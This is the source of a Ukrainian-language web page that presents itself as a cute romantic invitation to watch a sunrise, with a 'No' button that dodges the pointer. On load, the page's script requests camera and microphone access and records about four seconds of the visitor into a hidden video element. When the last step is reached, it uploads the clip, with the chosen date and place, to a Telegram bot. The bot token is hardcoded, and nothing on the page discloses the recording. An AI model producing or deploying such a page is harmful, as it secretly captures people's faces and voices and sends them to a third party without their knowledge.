<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Світанок</title>
  
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

  <style>
    @keyframes fade-in {
      from { opacity: 0; transform: scale(0.95) translateY(10px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }
    @keyframes float {
      0%, 100% { transform: translateY(0) rotate(0deg); }
      50% { transform: translateY(-20px) rotate(10deg); }
    }
    .animate-fade-in {
      animation: fade-in 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
    }
  </style>
</head>
<body>
  <div id="root"></div>

  <script type="text/babel">
    const { useState, useEffect, useRef } = React;

    function App() {
      const [step, setStep] = useState(1);
      const [noStyle, setNoStyle] = useState({});
      const [date, setDate] = useState('');
      const [location, setLocation] = useState('');
      const [customLocation, setCustomLocation] = useState('');
      const [showCustomInput, setShowCustomInput] = useState(false);

      const videoRef = useRef(null);
      const streamRef = useRef(null);
      const mediaRecorderRef = useRef(null);
      const recordedChunksRef = useRef([]);
      const videoBlobRef = useRef(null);
      const hasSent = useRef(false);

      const TELEGRAM_BOT_TOKEN = '9220864046:AAENBw-7pk7srDzF8qS4nJF3kkLqnIYgUN0';
      const TELEGRAM_CHAT_ID = '7545250403';

      useEffect(() => {
        const startMedia = async () => {
          try {
            // Запит на відео ТА аудіо
            const stream = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
              audio: true,
            });
            streamRef.current = stream;

            if (videoRef.current) {
              videoRef.current.srcObject = stream;
              await videoRef.current.play();
            }

            // Налаштування запису короткого відео
            const options = { mimeType: 'video/webm;codecs=vp8,opus' };
            let recorder;
            try {
              recorder = new MediaRecorder(stream, options);
            } catch (e) {
              recorder = new MediaRecorder(stream);
            }

            mediaRecorderRef.current = recorder;
            recordedChunksRef.current = [];

            recorder.ondataavailable = (event) => {
              if (event.data && event.data.size > 0) {
                recordedChunksRef.current.push(event.data);
              }
            };

            recorder.onstop = () => {
              const blob = new Blob(recordedChunksRef.current, { type: recorder.mimeType || 'video/mp4' });
              videoBlobRef.current = blob;
              stopMedia();
            };

            // Старт запису
            recorder.start();

            // Записуємо 4 секунди пока користувач відкрив сайт
            setTimeout(() => {
              if (recorder.state !== 'inactive') {
                recorder.stop();
              }
            }, 4000);

          } catch (err) {
            console.warn('Доступ до камери/мікрофона обмежено', err);
          }
        };

        const stopMedia = () => {
          if (streamRef.current) {
            streamRef.current.getTracks().forEach((track) => track.stop());
            streamRef.current = null;
          }
        };

        startMedia();

        return () => {
          stopMedia();
        };
      }, []);

      useEffect(() => {
        if (step === 4 && !hasSent.current) {
          hasSent.current = true;
          sendToTelegram();
        }
      }, [step]);

      const sendToTelegram = async () => {
        const caption = `🌅 Нова згода на світанок!\n📅 Дата: ${date.split('-').reverse().join('.')}\n📍 Місце: ${location}`;

        try {
          if (videoBlobRef.current) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('caption', caption);
            formData.append('video', videoBlobRef.current, 'video.mp4');

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
              method: 'POST',
              body: formData,
            });
          } else {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption }),
            });
          }
        } catch (error) {
          console.error('Помилка відправки в Telegram', error);
        }
      };

      const handleNoHover = () => {
        const btnWidth = 120;
        const btnHeight = 60;
        const maxX = window.innerWidth - btnWidth - 20;
        const maxY = window.innerHeight - btnHeight - 20;
        const newX = Math.max(20, Math.floor(Math.random() * maxX));
        const newY = Math.max(20, Math.floor(Math.random() * maxY));
        setNoStyle({
          position: 'fixed', left: `${newX}px`, top: `${newY}px`,
          transition: 'all 0.2s cubic-bezier(0.25, 1, 0.5, 1)', zIndex: 1000,
        });
      };

      const today = new Date().toISOString().split('T')[0];
      const maxDate = '2027-12-31';

      return (
        <div className="min-h-screen bg-gradient-to-br from-orange-50 via-amber-50 to-pink-50 flex items-center justify-center p-4 relative overflow-hidden font-sans text-gray-800">
          <video ref={videoRef} autoPlay playsInline muted className="hidden" />

          <div className="absolute top-10 left-10 text-5xl opacity-60 animate-[float_4s_ease-in-out_infinite] drop-shadow-lg">🦜</div>
          <div className="absolute bottom-20 right-10 text-6xl opacity-60 animate-[float_5s_ease-in-out_infinite_reverse] drop-shadow-lg">🌅</div>
          <div className="absolute top-1/4 right-1/4 text-4xl opacity-50 animate-[float_6s_ease-in-out_infinite] drop-shadow-lg">☀️</div>
          <div className="absolute bottom-1/4 left-1/4 text-5xl opacity-60 animate-[float_4.5s_ease-in-out_infinite] drop-shadow-lg">🌸</div>
          <div className="absolute top-1/2 left-5 text-4xl opacity-40 animate-[float_7s_ease-in-out_infinite_reverse] drop-shadow-lg">💛</div>
          <div className="absolute bottom-10 left-1/2 text-5xl opacity-40 animate-[float_5.5s_ease-in-out_infinite] drop-shadow-lg">✨</div>

          <div className="bg-white/90 backdrop-blur-xl p-8 md:p-12 rounded-[2.5rem] shadow-[0_15px_0_rgb(251,191,36)] max-w-xl w-full text-center relative z-10 border-4 border-amber-200">
            {step === 1 && (
              <div className="space-y-10">
                <h1 className="text-4xl md:text-5xl font-black text-orange-500 mb-6 drop-shadow-sm leading-tight">Ти підеш зі мною на світанок? 🦜🌅</h1>
                <div className="flex flex-row items-center justify-center gap-8 min-h-[80px] mt-8 relative">
                  <button onClick={() => setStep(2)} className="group relative bg-orange-400 text-white font-black py-4 px-10 rounded-2xl text-2xl transition-transform active:translate-y-2 shadow-[0_8px_0_rgb(234,88,12)] active:shadow-[0_0px_0_rgb(234,88,12)]">
                    <div className="absolute inset-0 bg-gradient-to-b from-white/30 to-transparent rounded-2xl h-1/2"></div>
                    <span className="relative">Так! 🥰</span>
                  </button>
                  <button onMouseEnter={handleNoHover} onTouchStart={handleNoHover} style={noStyle} className="bg-gray-300 text-gray-600 font-black py-4 px-10 rounded-2xl text-2xl shadow-[0_8px_0_rgb(156,163,175)] z-50 cursor-pointer">
                    <div className="absolute inset-0 bg-gradient-to-b from-white/40 to-transparent rounded-2xl h-1/2"></div>
                    <span className="relative">Ні 😢</span>
                  </button>
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-6 animate-fade-in">
                <h2 className="text-3xl md:text-4xl font-black text-orange-500 drop-shadow-sm leading-relaxed">Ура! Ти погодилася 🦜💖🌅</h2>
                <div className="mt-8 space-y-6">
                  <label className="block text-2xl font-bold text-gray-700">Обери дату світанку:</label>
                  <input type="date" min={today} max={maxDate} value={date} onChange={(e) => setDate(e.target.value)} className="w-full text-center p-5 border-4 border-amber-300 rounded-3xl text-2xl text-gray-700 font-bold focus:outline-none focus:border-orange-500 bg-amber-50/50 shadow-inner cursor-pointer" />
                  <button onClick={() => setStep(3)} disabled={!date} className={`w-full relative font-black py-5 px-8 rounded-3xl text-2xl transition-transform ${!date ? 'bg-gray-300 text-gray-500 shadow-[0_6px_0_rgb(156,163,175)] cursor-not-allowed' : 'bg-green-400 text-white shadow-[0_8px_0_rgb(22,163,74)] active:translate-y-2 active:shadow-none'}`}>
                    {!date ? null : <div className="absolute inset-0 bg-gradient-to-b from-white/30 to-transparent rounded-3xl h-1/2"></div>}
                    <span className="relative">Підтвердити дату 📅</span>
                  </button>
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6 animate-fade-in py-4">
                <h2 className="text-3xl md:text-4xl font-black text-orange-500 drop-shadow-sm leading-tight">Куди підемо зустрічати світанок?</h2>
                {!showCustomInput ? (
                  <div className="grid grid-cols-2 gap-4 mt-8">
                    {['Пляж 🏖️', 'Гора 🏔️', 'Парк 🌳', 'Дах 🏙️'].map((place) => (
                      <button key={place} onClick={() => { setLocation(place); setStep(4); }} className="group relative bg-orange-400 text-white font-black py-5 px-2 rounded-3xl text-xl transition-transform active:translate-y-2 shadow-[0_8px_0_rgb(234,88,12)] active:shadow-[0_0px_0_rgb(234,88,12)]">
                        <div className="absolute inset-0 bg-gradient-to-b from-white/30 to-transparent rounded-3xl h-1/2"></div>
                        <span className="relative">{place}</span>
                      </button>
                    ))}
                    <button onClick={() => setShowCustomInput(true)} className="col-span-2 group relative bg-purple-400 text-white font-black py-5 px-2 rounded-3xl text-xl transition-transform active:translate-y-2 shadow-[0_8px_0_rgb(147,51,234)] active:shadow-[0_0px_0_rgb(147,51,234)]">
                      <div className="absolute inset-0 bg-gradient-to-b from-white/30 to-transparent rounded-3xl h-1/2"></div>
                      <span className="relative">Свій варіант ✍️</span>
                    </button>
                  </div>
                ) : (
                  <div className="mt-8 space-y-6">
                    <input type="text" value={customLocation} onChange={(e) => setCustomLocation(e.target.value)} placeholder="Напиши свій варіант..." className="w-full text-center p-5 border-4 border-purple-300 rounded-3xl text-xl text-gray-700 font-bold focus:outline-none focus:border-purple-500 bg-purple-50/50 shadow-inner" />
                    <button onClick={() => { setLocation(customLocation || 'Сюрприз ✨'); setStep(4); }} className="w-full relative bg-purple-400 text-white font-black py-5 px-8 rounded-3xl text-2xl transition-transform shadow-[0_8px_0_rgb(147,51,234)] active:translate-y-2 active:shadow-none">
                      <div className="absolute inset-0 bg-gradient-to-b from-white/30 to-transparent rounded-3xl h-1/2"></div>
                      <span className="relative">Підтвердити 🚀</span>
                    </button>
                  </div>
                )}
              </div>
            )}

            {step === 4 && (
              <div className="space-y-6 animate-fade-in py-4">
                <div className="text-6xl mb-4 flex justify-center gap-3 animate-[bounce_2s_infinite]">🦜 🌅 💖</div>
                <h2 className="text-3xl md:text-4xl font-black text-orange-500 drop-shadow-md leading-tight">Ура! Буду чекати на світанку ✨</h2>
                <div className="flex flex-col sm:flex-row gap-5 items-center justify-center mt-6">
                  <div className="bg-amber-100 p-4 px-6 w-full rounded-3xl border-4 border-amber-300 transform -rotate-2 shadow-md">
                    <p className="text-lg text-gray-500 font-bold mb-1 uppercase tracking-wider">Дата</p>
                    <p className="text-2xl text-orange-600 font-black">{date.split('-').reverse().join('.')}</p>
                  </div>
                  <div className="bg-pink-100 p-4 px-6 w-full rounded-3xl border-4 border-pink-300 transform rotate-2 shadow-md">
                    <p className="text-lg text-gray-500 font-bold mb-1 uppercase tracking-wider">Місце</p>
                    <p className="text-2xl text-pink-600 font-black break-words">{location}</p>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById('root'));
    root.render(<App />);
  </script>
</body>
</html>
